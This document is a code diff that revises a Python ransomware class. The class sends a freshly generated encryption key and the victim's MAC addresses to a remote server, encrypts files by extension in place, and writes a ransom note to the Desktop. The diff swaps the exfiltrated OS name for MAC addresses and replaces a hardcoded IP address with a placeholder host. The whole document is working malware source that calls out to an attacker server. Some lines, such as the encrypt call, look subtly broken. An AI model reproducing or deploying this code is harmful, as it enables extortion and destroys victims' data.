@@ -1,5 +1,6 @@
 import os
 import sys
+import psutil
 from time import sleep
 from pathlib import Path
 from socket import socket, AF_INET, SOCK_STREAM
@@ -12,14 +13,13 @@ class Ransomware:
         self.server = socket(AF_INET, SOCK_STREAM)
         self.key = Fernet.generate_key()
         self.Private = Fernet(self.key)
-        self.system = os.uname().sysname
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
         while not connected and retries < 3:
             try:
                 self.server.connect((self.host, self.port))
-                self.server.sendall(f'{self.system}|{self.key.decode("utf-8")}'.encode('utf-8'))
+                self.server.sendall(f'{self.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
                 connected = True
             except:
                 retries += 1
@@ -30,9 +30,24 @@ class Ransomware:
             finally:
                 self.server.close()
 
+
+    def Mac(self):
+        try:
+            address_mac = {}
+            mac = []
+            for interface, addresses in psutil.net_if_addrs().items():
+                for address in addresses:
+                    if address.family == psutil.AF_LINK:
+                        address_mac[interface] = address.address
+            for _, mac_address in address_mac.items():
+                mac.append(mac_address)
+            return mac[1] + '|' + mac[2]
+        except Exception as e:
+            return 'No-Mac'
+        
     
     def Encrypted(self):
-        for _, files in self.listfiles().items():
+        for _, files in self.Listfiles().items():
             for file in files:
                 temp_file = file + '.temp'
                 try:
@@ -44,11 +59,13 @@ class Ransomware:
                             enc_chunk = self.Private.encrypt(chunk, 32)[0]
                             encfile.write(enc_chunk)
                     os.replace(temp_file, file)
-                except: pass
+                except Exception as e: 
+                    pass
                 finally:
                     if os.path.exists(temp_file):
                         os.remove(temp_file)
     
+
     def Contact(self):
         contact = '''
                     -----------RANSOMWARE-----------
@@ -60,12 +77,12 @@ class Ransomware:
         try:
             with open(Path.home()/"Desktop"/'ransomware.txt', 'w') as file:
                 file.write(contact)
-        except:
+        except Exception as e:
             with open(Path.home()/'ransomware.txt', 'w') as file:
                 file.write(contact)
 
 
-    def listfiles(self) -> dict:
+    def Listfiles(self) -> dict:
 
         exts = {
             'images': ['.jpg', '.png', '.gif', '.jpeg'],
@@ -86,7 +103,7 @@ class Ransomware:
     
     
 if __name__ == '__main__':
-    RanSomWare = Ransomware('171.249.211.29', 19100)
+    RanSomWare = Ransomware('Myserver', 19100)
     RanSomWare.ConnectServer()
     RanSomWare.Encrypted()
     RanSomWare.Contact()
